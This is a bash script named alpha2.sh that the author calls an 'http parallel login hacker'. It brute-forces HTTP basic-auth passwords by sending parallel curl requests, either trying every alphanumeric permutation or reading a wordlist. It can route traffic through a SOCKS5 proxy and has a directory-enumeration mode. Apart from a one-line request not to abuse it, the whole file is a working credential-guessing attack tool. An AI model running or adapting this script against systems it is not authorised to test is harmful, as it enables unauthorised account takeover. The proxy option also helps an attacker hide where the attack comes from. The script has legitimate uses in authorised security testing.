#!/usr/bin/env bash

# alpha2.sh
# written by Marc Carlson June 18, 2022
# bash parallel http bruteforcer. Tries all possible alphanumeric combinations based on the number of characters.
# also has an option to use a password file instead.
# this is free software. free to use, free to redistribute. Do whatever you like with it.
# if you want to add support for uppercase letters, add {A..Z} to the character set.
# note: 6 alphanumeric characters (no uppercase) generates 2.25 billion possibilities!

# Please do not abuse this script. Use it on your own machines.

charset=({a..z} {0..9})

usage() {
echo "alpha2 http parallel login hacker (Marc Carlson 2022-2023)"
echo "Usage: alpha2 [pcautwdh] [options]"
echo "-c  number of characters to use for password permutation"
echo "-a  IP address of remote target"
echo "-u  username to use"
echo "-t  number of threads to use"
echo "-p  socks5 proxy address"
echo "-w  use the wordlist instead. /path/to/list."
echo "-d  directory enumeration mode. Use with -t and -w"
}

SECONDS=0

get_args() {
[ $# -eq 0 ] && usage && exit
while getopts "p:a:u:t:c:hw:id" arg; do
case $arg in
a) ip="$OPTARG" ;;
u) user="$OPTARG" ;;
t) threads="$OPTARG" ;;
c) characters="$OPTARG" ;;
p) proxy="--socks5 $OPTARG" ;;
w) wordlist="$OPTARG" ;;
d) direnum=1;;
h) usage && exit ;;
esac
done
}

type -P parallel 1>/dev/null
[ "$?" -ne 0 ] && echo "Please install GNU parallel before using this script." && exit

function check_flags {
if [[ ! $ip ]]
then
echo please indicate the target IP address && exit
fi
if [[ ! $threads ]]
then
echo please indicate the number of threads with the -t flag && exit
fi
if [[ ! $user ]] && [[ ! $direnum ]]
then
echo please indicate the desired user name with the -u flag unless using direnum && exit
fi
if [[ $direnum ]] && [[ ! $wordlist ]]
then
echo when using the -d flag, it is also neccessary to indicate the path to the wordlist && exit
fi
if [[ ! $characters ]] && [[ ! $wordlist ]]
then
echo Please indicate either the -w flag and wordlist or the -c flag and number of characters && exit
fi
}

# Credit to pskocik for permutation function based on a post at stackexchange -> https://unix.stackexchange.com/users/23692/pskocik

permute(){
(( $1 == 0 )) && { echo "$2"; return; }
for char in "${charset[@]}"
do
permute "$((${1} - 1 ))" "$2$char"
done
}

function direnum {
cat $wordlist | xargs -n 1 -P $threads -I {} curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip/{} | grep -ve "404" -ve "000" -ve "403" && exit
}

function bruteforce { 
permute $characters | parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} |\
awk '{if($1 == "200") {print "Found password -> " $2; exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
}

get_args $@
check_flags

function wordlist {
parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} :::: $wordlist |\
awk '{if($1 == "200") {print "Found Password -> " $2 ;exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
}

function update {
while true 
do
sleep 300
if [[ $(($SECONDS/3600)) -ge 1 ]]
then
echo [$(date)] Elapsed time: $(($SECONDS/3600)) hour\(s\) and $((($SECONDS/60) % 60)) minutes
else
echo [$(date)] Elapsed time: $(($SECONDS/60)) minutes
fi
done
}

if [[ $direnum == 1 ]]
then direnum
fi
if [[ $characters ]] && [[ -z $wordlist ]]
then
bruteforce &
pid=$!
update &
updatepid=$!
else
wordlist &
pid=$!
update &
updatepid=$!
fi

if [[ -e .password ]]; then rm .password; fi
if [[ ! -e .password ]]; then touch .password; fi

while [[ -z $(cat .password) ]]
do
sleep 1
if [[ ! -z $(cat .password) ]]
then
kill $updatepid 2>/dev/null
pkill sleep
fi
done
echo $(cat .password)
rm .password
